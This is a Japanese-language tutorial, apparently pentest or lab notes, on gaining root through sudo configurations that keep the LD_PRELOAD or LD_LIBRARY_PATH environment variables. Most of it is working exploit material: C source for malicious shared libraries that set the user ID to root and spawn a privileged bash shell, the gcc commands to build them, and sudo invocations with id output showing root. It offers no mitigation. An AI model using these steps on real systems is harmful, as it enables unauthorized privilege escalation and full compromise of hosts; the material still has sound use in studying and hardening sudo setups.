sudoを通して実行されるプログラムは、ユーザーの環境から環境変数を継承することができます。   
etc/sudoers 設定ファイルで、***env_reset*** オプションが設定されている場合、sudo は新しい最小限の環境でプログラムを実行します。   
***env_keep*** オプションを使用すると、特定の環境変数をユーザーの環境から保持することができます。  
設定されたオプションは、sudo -lを実行したときに表示されます。    
## LD_PRELOAD
LD_PRELOAD は環境変数で、共有オブジェクト (.so) ファイルのパスを設定します。   
設定されると、共有オブジェクトは他のどのオブジェクトよりも先にロードされます。   
カスタム共有オブジェクトを作成し、init()関数を作成することで、オブジェクトがロードされると同時にコードを実行することができるようになります。   
実ユーザー ID が実効ユーザー ID と異なる場合、LD_PRELOAD は機能しません。   
env_keep オプションを使用して LD_PRELOAD 環境変数を保持するように sudo を構成する必要があります。   
# Privilege Escalation
1. ユーザーがsudoで実行を許可されているプログラムをリストアップします。
```
$ sudo -l
Matching Defaults entries for user on this host:
env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
...
```
env_keepオプションには、環境変数である   
LD_PRELOAD 環境変数が含まれることに注意してください。   
2. 以下の内容のファイル（preload.c）を作成します。
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
```
3. preload.cをpreload.soにコンパイルします。
```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
4. 環境変数LD_PRELOADにpreload.soファイルのフルパスを設定し、sudoを使って許可された任意のプログラムを実行します。
```
$ sudo LD_PRELOAD=/tmp/preload.so apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```
## LD_LIBRARY_PATH
LD_LIBRARY_PATH環境変数は、共有ライブラリが最初に検索されるディレクトリのセットを含んでいます。   
lddコマンドは、プログラムが使用する共有ライブラリを表示するために使用されます。   
```
$ ldd /usr/sbin/apache2
```
プログラムが使用するものと同じ名前の共有ライブラリを作成し、LD_LIBRARY_PATH をその親ディレクトリに設定すると、プログラムは代わりに共有ライブラリをロードします。   
# Privilege Escalation
1. apache2 プログラムファイルに対して ldd を実行します。
```
$ ldd /usr/sbin/apache2
linux-vdso.so.1 => (0x00007fff063ff000)
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```
この方法で共有オブジェクトをハイジャックするのは当たり外れがあります。リストから1つ選んで試してみてください(libcrypt.so.1がうまくいくようです)。
2. 以下の内容のファイル（library_path.c）を作成します。
```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```
3. library_path.c を libcrypt.so.1 にコンパイルしてください。
```
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
4. 環境変数LD_LIBRARY_PATHに現在のパス（library_path.cをコンパイルした場所）を設定しながら、sudoでapache2を実行します。
```$ sudo LD_LIBRARY_PATH=. apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

